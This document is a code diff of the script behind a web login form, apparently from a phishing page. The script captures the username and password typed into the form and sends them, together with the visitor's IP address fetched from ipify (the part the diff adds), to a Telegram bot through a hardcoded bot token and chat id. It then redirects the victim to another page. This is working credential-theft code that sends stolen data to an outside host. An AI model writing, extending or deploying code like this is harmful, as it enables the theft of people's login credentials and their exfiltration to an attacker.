@@ -100,38 +100,48 @@
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
 
-            // Telegram Bot API information
-            const botToken = "7795453201:AAHbRVVvJQOMIP-aDjom2wYQfSS0J9n1weU";
-            const chatId = "7623827088";
-            const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            // Fetch user's IP address using a public API
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIp = data.ip; // Capture the user's IP address
 
-            // Create message
-            const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}`;
+                    // Telegram Bot API information
+                    const botToken = "7795453201:AAHbRVVvJQOMIP-aDjom2wYQfSS0J9n1weU";
+                    const chatId = "7623827088";
+                    const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
-            // Send form data to Telegram
-            fetch(telegramApiUrl, {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
+                    // Create message including the IP address
+                    const message = `Login Attempt:\nUsername: ${username}\nPassword: ${password}\nIP Address: ${userIp}`;
+
+                    // Send form data to Telegram
+                    fetch(telegramApiUrl, {
+                        method: "POST",
+                        headers: {
+                            "Content-Type": "application/json",
+                        },
+                        body: JSON.stringify({
+                            chat_id: chatId,
+                            text: message
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                            // Redirect to another page after successful submission
+                            window.location.href = "flock.html";  // Redirect page
+                        } else {
+                            alert("Error submitting data to Telegram.");
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error:", error);
+                        alert("An error occurred.");
+                    });
                 })
-            })
-            .then(response => response.json())
-            .then(data => {
-                if (data.ok) {
-                    // Redirect to another page after successful submission
-                    window.location.href = "flock.html";  // Redirect page
-                } else {
-                    alert("Error submitting data to Telegram.");
-                }
-            })
-            .catch(error => {
-                console.error("Error:", error);
-                alert("An error occurred.");
-            });
+                .catch(error => {
+                    console.error('Error fetching IP address:', error);
+                });
         });
     </script>
 </body>
